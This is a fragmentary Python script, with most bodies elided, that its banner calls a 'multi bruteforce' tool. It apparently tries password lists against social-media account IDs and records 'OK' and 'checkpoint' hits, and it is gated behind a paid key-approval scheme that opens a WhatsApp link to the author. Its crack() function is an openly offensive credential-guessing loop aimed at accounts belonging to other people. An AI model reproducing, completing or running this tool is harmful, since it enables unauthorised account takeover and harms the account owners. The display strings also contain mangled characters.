...
try:
	...
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mSANGAM ')
...
def xoshnaw(): 
  ...
  id = "-".join(uuid) 
  print("\x1b[1;9YOUR ID\x1b[1;91m : "+id) 
  try: 
    httpCaht = requests.get("https://github.com/S4NG4M/approve.txt/blob/main/approve.txt").text 
    if id in httpCaht: 
      print("\x1b[1;96mâ•£ STATUS: PREMIUM\033[1;92m[âœ”]") 
      msg = str(os.geteuid()) 
      time.sleep(3) 
      pass 
    else: 
      print("\x1b[38;5;248 ID NOT REGISTERED \x1b[1;91m[✓]") 
      print("\x1b[38;5;208mCOPY AND SEND KEY TO OENER !!!") 
      os.system('xdg-open https://wa.me/+9779800945736?text=SIR+SANGAM+PLEASE+APPROVR+MY+KEY') 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
...
def banner():
  ...
  SCRIPT MULTI BRUTEFORCE BY MR SANGAM CHEETRI 
...
def login_lagi334():
	try:
		...
		print(f'  {u}[{h}SANGAM {u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{P}[SANGAM]{P}[{P}{loop}{P}/{P}{len(id)}{P}] OK{P}[{H}{ok}{P}] CP{P}[{P}{cp}{x}]Ã—[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}[SANGAM  -CP] {idf}  {pw} {N}')     
